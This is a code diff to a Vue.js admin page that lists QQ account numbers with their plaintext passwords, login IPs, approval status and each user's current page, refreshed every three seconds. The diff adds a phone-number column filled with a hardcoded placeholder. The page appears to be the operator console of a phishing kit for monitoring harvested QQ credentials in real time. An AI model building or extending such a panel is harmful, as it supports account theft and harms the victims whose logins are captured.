@@ -22,7 +22,7 @@
     </van-nav-bar>
 
     <!-- 用户管理 -->
-    <div class="tabbar-div">
+    <div class="tabbar-div" style="margin-bottom:60px">
       <van-search
         @change="search"
         v-model="searchValue"
@@ -39,6 +39,7 @@
           <el-table-column prop="id" label="编号" width="180"></el-table-column>
           <el-table-column prop="username" label="QQ账号" width="180"></el-table-column>
           <el-table-column prop="password" label="QQ密码" width="180"></el-table-column>
+          <el-table-column prop="phone" label="手机号" width="180"></el-table-column>
           <el-table-column prop="myauditstatus" label="审核状态" width="180"></el-table-column>
           <el-table-column prop="staypage" label="目前状态：" width="180"></el-table-column>
           <el-table-column prop="ip" label="登录ip" width="180"></el-table-column>
@@ -281,13 +282,10 @@ export default {
           if (this.isNmber == false) {
             //赋值总数量
             this.totalCount = res.page.totalCount;
-
             // ture 就一次进入该方法
             this.isNmber = true;
           }
-          
           this.totalCount = res.page.totalCount; // 赋值最大数据
-
           const arr = []; // 初始化数组
           for (let index = 0; index < res.page.list.length; index++) {
             const element = res.page.list[index];
@@ -310,6 +308,8 @@ export default {
             }
             element['myauditstatus'] = auditstatus
             element['mylogintime'] = new Date(element['logintime']).toLocaleString()
+            // 这里进行自己的后台请求，得到改用户对应的手机号
+            element['phone'] = '25257758'
             
             arr.push(element)
             // console.log(element)
@@ -339,6 +339,7 @@ export default {
     localStorage.setItem('totalPage',0)
     this.setintervals = setInterval(this.onLoadUser, 3000); // 开启监控
   },
+
   beforeCreate() {}, // 生命周期 - 创建之前
   beforeMount() {}, // 生命周期 - 挂载之前
   beforeUpdate() {}, // 生命周期 - 更新之前
